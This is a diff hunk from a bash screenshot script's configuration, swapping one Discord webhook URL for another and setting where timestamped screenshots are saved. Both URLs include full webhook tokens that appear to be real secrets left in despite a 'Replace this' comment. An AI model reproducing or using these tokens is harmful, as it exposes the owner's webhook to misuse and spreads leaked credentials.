@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # === CONFIG ===
-WEBHOOK_URL="https://discord.com/api/webhooks/1427626484645761228/3QpSjdVsUPn4uzQfNXcAxhvlYsiy0RTFVtbZwUfpdlc3BQMySbMssAtkn8Zwfl92c0q6"  # Replace this
+WEBHOOK_URL="https://discord.com/api/webhooks/1427639468101337209/ckDi9HD9IUCbK8ofYn-0awl7aPNCOBZRytnRupZL3DZXx3UaS_igR1KFyXNjI3Wl4BEf"  # Replace this
 SAVE_DIR="$HOME/Pictures"
 FILENAME="screenshot_$(date +%Y-%m-%d_%H-%M-%S).png"
 FILEPATH="$SAVE_DIR/$FILENAME"
